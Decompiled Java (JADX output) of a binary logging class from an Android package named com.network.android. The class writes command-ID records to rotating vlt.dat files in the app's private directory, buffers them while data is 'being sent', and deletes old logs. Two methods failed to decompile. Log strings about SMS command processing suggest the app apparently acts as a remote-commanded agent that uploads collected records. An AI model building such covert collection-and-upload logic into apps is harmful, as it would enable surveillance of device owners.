package com.network.android.c.a;

import android.content.Context;
import android.content.SharedPreferences;
import com.network.android.agent.NetworkApp;
import com.network.media.q;
import java.io.ByteArrayOutputStream;
import java.io.DataOutputStream;
import java.io.File;
import java.util.HashMap;

public final class b {

    /* renamed from: a  reason: collision with root package name */
    static String f73a = "vlt.dat";
    static String b = ("0" + f73a);
    static String c = "ltmp.dat";
    public static String d = null;
    public static String e = "/data/data/com.network.android/logs/";
    private static ByteArrayOutputStream f = new ByteArrayOutputStream();
    private static DataOutputStream g = new DataOutputStream(f);
    private static Object h = new Object();
    private static boolean i = false;
    private static HashMap j = null;

    static {
        try {
            File file = new File(e);
            if (!file.exists()) {
                file.mkdir();
                a.a("make new directory" + file.getAbsolutePath());
            }
        } catch (Throwable th) {
            a.a("processSMScommand: " + th.getMessage(), th);
        }
    }

    public static synchronized void a() {
        synchronized (b.class) {
            a.a("removeAllLog start 6");
            synchronized (h) {
                i = false;
                File file = new File(e);
                if (!file.exists()) {
                    a.a("removeAllLog main directory doesn't exists, returning");
                } else {
                    try {
                        File[] listFiles = file.listFiles();
                        for (File file2 : listFiles) {
                            try {
                                if (!file2.getPath().contains(c)) {
                                    if (file2.delete()) {
                                        a.a("removeAllLog Logfile was removed: " + file2.getAbsolutePath());
                                    } else {
                                        a.a("Logfile NOT removed !!!: " + file2.getAbsolutePath());
                                    }
                                }
                            } catch (Throwable th) {
                                a.a("removeAllLog exception at file : " + file2.getAbsolutePath(), th);
                            }
                        }
                    } catch (Throwable th2) {
                        a.a("removeAllLog exception: " + th2.getMessage(), th2);
                    }
                    a.a("removeAllLog end. m_currentFilePath was " + d);
                    if (c != d) {
                        d = null;
                    }
                }
            }
        }
    }

    public static synchronized void a(int i2, short s) {
        synchronized (b.class) {
            try {
                b(i2, s, "", null);
            } catch (Throwable th) {
                a.a("write 2: " + th.getMessage(), th);
            }
        }
        return;
    }

    public static synchronized void a(int i2, short s, String str) {
        synchronized (b.class) {
            b(i2, s, str, null);
        }
    }

    public static synchronized void a(int i2, short s, String str, Object obj) {
        synchronized (b.class) {
            if (obj != null) {
                b(i2, s, str, new c(((Integer) obj).intValue()));
            } else {
                b(i2, s, str, null);
            }
        }
    }

    private static void a(Context context) {
        try {
            SharedPreferences.Editor edit = context.getSharedPreferences("NetworkPreferences", 0).edit();
            edit.putString("logNetwork", d);
            edit.commit();
            a.a("saveCurrentFileToPersistantStorage saved log path to persistent storage: " + d);
        } catch (Throwable th) {
            a.a("saveCurrentFileToPersistantStorage exception: " + th.getMessage(), th);
        }
    }

    public static void a(String str) {
        a(0, -15536, "", com.network.h.b.c(str));
    }

    public static byte[] a(short s) {
        return a(s, (Object) null);
    }

    private static byte[] a(short s, Object obj) {
        a.a("log createByteArrayError CommandIdClass code == " + ((int) s));
        g.writeByte(1);
        g.writeShort(4);
        g.writeInt((int) (System.currentTimeMillis() / 1000));
        g.writeByte(2);
        g.writeShort(2);
        g.writeShort(s);
        if (obj == null) {
            return d();
        }
        if (obj.getClass().equals(String.class)) {
            g.writeByte(5);
            g.writeShort(((String) obj).length());
            g.write(((String) obj).getBytes());
        } else if (obj.getClass().equals(Integer.class)) {
            g.writeByte(3);
            g.writeShort(4);
            a.a("log createByteArrayError size == 4");
            g.writeInt(((Integer) obj).intValue());
            a.a("log createByteArrayError CommandIdClass Integer command id == " + ((Integer) obj));
        } else if (obj.getClass().equals(c.class)) {
            g.writeByte(6);
            g.writeShort(4);
            a.a("log createByteArrayError size == 4");
            g.writeInt(((c) obj).f74a);
            a.a("log createByteArrayError CommandIdClass Object command id == " + ((c) obj).f74a);
        }
        return d();
    }

    /* JADX WARNING: Removed duplicated region for block: B:65:0x033c A[SYNTHETIC, Splitter:B:65:0x033c] */
    /* JADX WARNING: Removed duplicated region for block: B:71:0x035d A[SYNTHETIC, Splitter:B:71:0x035d] */
    /* Code decompiled incorrectly, please refer to instructions dump. */
    public static synchronized void b(int r12, short r13, java.lang.String r14, java.lang.Object r15) {
        /*
        // Method dump skipped, instructions count: 920
        */
        throw new UnsupportedOperationException("Method not decompiled: com.network.android.c.a.b.b(int, short, java.lang.String, java.lang.Object):void");
    }

    /* JADX WARNING: Removed duplicated region for block: B:57:0x0171  */
    /* JADX WARNING: Removed duplicated region for block: B:65:0x0199  */
    /* JADX WARNING: Removed duplicated region for block: B:78:0x0129 A[SYNTHETIC] */
    /* Code decompiled incorrectly, please refer to instructions dump. */
    public static synchronized byte[] b() {
        /*
        // Method dump skipped, instructions count: 457
        */
        throw new UnsupportedOperationException("Method not decompiled: com.network.android.c.a.b.b():byte[]");
    }

    public static boolean c() {
        if (d == null || c == d || Integer.parseInt(d.substring(0, 1)) <= 0) {
            return false;
        }
        a.a("Log file is bigger then the limit !!!!: " + d);
        return true;
    }

    private static synchronized byte[] d() {
        Throwable th;
        byte[] bArr;
        synchronized (b.class) {
            try {
                bArr = f.toByteArray();
                try {
                    g.close();
                    f.close();
                    f = new ByteArrayOutputStream();
                    g = new DataOutputStream(f);
                } catch (Throwable th2) {
                    th = th2;
                    a.a("LoggerBinary Flush exception data:\n\n" + th.getMessage(), th);
                    return bArr;
                }
            } catch (Throwable th3) {
                bArr = null;
                th = th3;
                a.a("LoggerBinary Flush exception data:\n\n" + th.getMessage(), th);
                return bArr;
            }
        }
        return bArr;
    }

    private static synchronized String e() {
        String str = null;
        synchronized (b.class) {
            synchronized (h) {
                try {
                    a.a("getCurrentLogFilePath start. isSending: " + i);
                    File file = new File(e);
                    if (!file.exists()) {
                        a.a("getCurrentLogFilePath dir doesn't exists. creating");
                        d = null;
                        file.mkdirs();
                    }
                    if (i) {
                        a.a("getCurrentLogFilePath we are currently sending data. writing to temp file");
                        new File(e + c).createNewFile();
                        d = c;
                        a(NetworkApp.a());
                        str = c;
                    } else if (c == d) {
                        File file2 = new File(e + b);
                        File file3 = new File(e + c);
                        if (file2.exists()) {
                            a.a("getCurrentLogFilePath our last file that we wrote to was temp file. rename it to first file");
                            if (!Boolean.valueOf(file3.renameTo(file2)).booleanValue()) {
                                a.a("getCurrentLogFilePath failed on renaming, try merge");
                                q.a(e + c, e + b, true);
                                file3.delete();
                            }
                        } else {
                            a.a("getCurrentLogFilePath our last file that we wrote to was temp file. merge it to first file");
                            q.a(e + c, e + b, true);
                            file3.delete();
                        }
                        d = b;
                        a(NetworkApp.a());
                        str = b;
                    } else if (d == null) {
                        a.a("getCurrentLogFilePath m_currentFilePath == null. creating a new file");
                        new File(e + b).createNewFile();
                        d = b;
                        a(NetworkApp.a());
                        str = b;
                    } else if (!d.contains(f73a)) {
                        a.b("getCurrentLogFilePath m_currentFilePath name is currpted. returning null");
                        d = null;
                        a(NetworkApp.a());
                    } else {
                        File file4 = new File(e + d);
                        if (!file4.exists()) {
                            a.a("getCurrentLogFilePath m_currentFilePath does not exists, creating it");
                            new File(e + d).createNewFile();
                            str = d;
                        } else if (file4.length() >= 2000) {
                            a.a("getCurrentLogFilePath m_currentFilePath is bigger than MAX_LOG_FILE.");
                            int parseInt = Integer.parseInt(d.substring(0, 1));
                            if (9 == parseInt) {
                                a.a("getCurrentLogFilePath file name index is begger than MAX_FILE_NAME_INT, starting from 0 again");
                                File file5 = new File(e + b);
                                file5.delete();
                                file5.createNewFile();
                                d = b;
                                a(NetworkApp.a());
                                str = b;
                            } else {
                                a.a("getCurrentLogFilePath moving to the next file name.");
                                String str2 = Integer.toString(parseInt + 1) + f73a;
                                File file6 = new File(e + str2);
                                file6.delete();
                                a.a("getCurrentLogFilePath Logfile was removed: " + file6.getAbsolutePath());
                                file6.createNewFile();
                                a.a("Logfile was created: " + file6.getAbsolutePath());
                                d = str2;
                                a(NetworkApp.a());
                                str = str2;
                            }
                        } else {
                            a.a("getCurrentLogFilePath all good. returning current file. not need to change anything");
                            str = d;
                        }
                    }
                } catch (Throwable th) {
                    a.a("getCurrentLogFilePath Exception: " + th.getMessage(), th);
                    d = null;
                    a.a("getCurrentLogFilePath somthing bad happend. returning null");
                    a(NetworkApp.a());
                }
            }
        }
        return str;
    }
}
